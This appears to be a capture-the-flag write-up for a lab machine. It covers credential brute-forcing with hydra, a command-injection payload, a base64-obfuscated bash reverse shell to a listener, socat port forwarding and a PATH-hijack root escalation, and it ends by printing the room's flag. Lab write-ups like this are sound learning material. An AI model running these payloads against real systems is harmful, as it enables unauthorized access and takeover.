# Enumeration 
We got our machine ip.Let's enumerate for open ports using nmap
>nmap -Sv -A -T4 -v <ip>

So the result is:
	![[Pasted image 20210724191808.png]]

Cheching for http service , we finds that it requires authorization so probably we will find creds for it in other open services.
Now , after firing ```enum4linux``` on SMB service we get:
	![[Pasted image 20210724192510.png]]
So , possible users of the machine are ```fox``` and ```rascal```.
# Creds for http
We got user names, so let's try to bryteforce for password for http authorization creds.
>echo -e "fox\nrascal "> users.txt
>hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \<ip> -t 64 http-get
	
It gives us succefull password:
	![[Pasted image 20210724193341.png]]
	
Don't cheat xD, lol You can't!
Every new ip has new creds xD!
SO bruteforce for your own ip.

Know let's login to the website:
![[Pasted image 20210724194411.png]]

Just the look of web page tells its some sort of remote code execution.
Using burpsuite and gibberish input we found that key word for the post request is "target"
First let's have a look at source page.
It provides us with two file filter.js and submit.js
Filter.js have this :
	```if(/^[A-Za-z0-9. ]*$/[_0x2911('0x5')](_0x31dff8[_0x2911('0x1')])==![]){ _0x31dff8[_0x2911('0x1')]='';} });```
Which i could not understand to its depth tbh but it gives some idea that our imput should start with "/"
and know with the help of this [page](https://github.com/payloadbox/command-injection-payload-list) and hit and trial(in burpsuite repeater)
It finally turns out that we have to use the follwing payload inside "target" keyword:
	```{"target" = "\";\<command>\n"}```
![[Pasted image 20210725124521.png]]

id , ls -la, and other common commands gave successfull response.
Let's fire up netcat listener using ```nc -lnvp 4242```
As we already know many characters are restricted so 
	using reverse shell payload did not work. So here is a little trick.
>echo "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1" | base64

It gives us hex of the revshell.
Now ,in burpsuite (where we put our commands) use the follwing format with own hex:
>echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80MjQyIDA+JjEK | base64 -d | bash

It immediately gives us the reverse shell of machine.

# User Escalation

Using typical privesc methods or linpeas does not tell anything.Next we looked for localport running on machine using `ss -tulwn`
	![[Pasted image 20210725130025.png]]
So it turns out that port 22 is running on localhost so no ssh port was visible while nmap scan.
We'll have to forward this port so that it is usable by remote machines.
First I tried [port forwarding using ssh](https://www.microfocus.com/documentation/reflection-desktop/16-2/rdesktop-guide/rsit_unix_local_forwarding.htm?view=print).but ssh command is not permitted to 'rascal'
There are other tools for port forwarding like [chisel](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)
	or [socat](https://www.cyberciti.biz/faq/linux-unix-tcp-port-forwarding/)
I used socat.
on attacker's machine
>wget https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true
	
>python3 -m http.server 8090
	
On victim's machine:
>cd tmp
	
>wget http://\<tun-ip>:8090/socat

>chmod +x socat

>./socat tcp-listen:9090,fork tcp:127.0.0.1:22 &

After this nmap scan will show a new open port 9090.
So we now have to try to login to the ssh connection running at 9090. But we don't have creds.
Well, we do what we do ,bruteforce.
possible users are fox or alice.
So.
>hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://10.10.104.71:9090/ -t 64 

by this, We get our creds for ssh.
# root escalation
	
```
fox@year-of-the-fox:~$ sudo -l
Matching Defaults entries for fox on year-of-the-fox:
    env_reset, mail_badpass
User fox may run the following commands on year-of-the-fox:
    (root) NOPASSWD: /usr/sbin/shutdown

```
Searching for it lead us to https://security.stackexchange.com/questions/246288/sudo-usr-sbin-halt-usr-sbin-reboot-usr-sbin-poweroff-how-to-leverag

But know the issue is what adjactly the name of the self made decptive file containing payload should be!
Well let's try to read the binary /usr/sbin/shutdown using strings. Oops, this command is not available on the machine. So downloading it (using python to host a http server and downloading using wget with ip as machine ip) and using `strings shutdown`shows `poweroff`	as a string.
it gives us the hint what should our file name be.
>cd /tmp 
	
>echo "/bin/bash" > poweroff 
	
>chmod 777 poweroff
	
>echo $PATH 
	
>export PATH=/tmp:$PATH

>sudo shutdown

	And we are root.
	
but........
	![[Pasted image 20210725133536.png]]
lol
searching here and there does not give us any usefull file.
But  its bit fishy that we found no files in rascal user directory whereas there were a few  in fox(although useless).
In rascal directory, using `ls -la` gives us the required file.
```T H M {ODM3NTdk MDljYmM4Z jdhZWFhY2 VjY2Fk} Here's the prize: YTAyNzQ3ODZlMmE2MjcwNzg2NjZkNjQ2Nzc5NzA0NjY2Njc2NjY4M2I2OTMyMzIzNTNhNjk2ODMw Mwo= Good luck!```